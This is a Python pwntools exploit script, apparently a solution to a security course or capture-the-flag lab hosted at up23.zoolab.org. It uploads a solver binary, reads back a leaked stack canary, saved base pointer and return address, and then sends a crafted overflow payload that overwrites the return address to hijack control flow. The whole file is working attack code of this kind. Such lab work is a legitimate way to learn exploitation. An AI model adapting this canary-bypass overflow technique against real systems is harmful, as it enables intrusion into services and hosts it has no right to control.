#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys

import pow as pw
from pwn import *

context.arch = "amd64"
context.os = "linux"

exe = "./solver_sample" if len(sys.argv) < 2 else sys.argv[1]

payload = None
if os.path.exists(exe):
    with open(exe, "rb") as f:
        payload = f.read()

# r = process("./remoteguess", shell=True)
# r = remote("localhost", 10816)
r = remote("up23.zoolab.org", 10816)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)

if payload != None:
    ef = ELF(exe)
    print(
        "** {} bytes to submit, solver found at {:x}".format(
            len(payload), ef.symbols["solver"]
        )
    )
    r.sendlineafter(b"send to me? ", str(len(payload)).encode())
    r.sendlineafter(b"to call? ", str(ef.symbols["solver"]).encode())
    pwnlib.ui.pause()
    r.sendafter(b"bytes): ", payload)
    r.recvline()
    canary = int(r.recvline(keepends=False).decode())
    rbp = int(r.recvline(keepends=False).decode())
    ret_addr = int(r.recvline(keepends=False).decode())

    ans = b"0" * 24
    ans += p64(canary)
    ans += p64(rbp)
    ans += p64(ret_addr + 171)
    ans += p64(0) * 2
    r.sendafter(b"answer?", ans)

else:
    r.sendlineafter(b"send to me? ", b"0")

r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
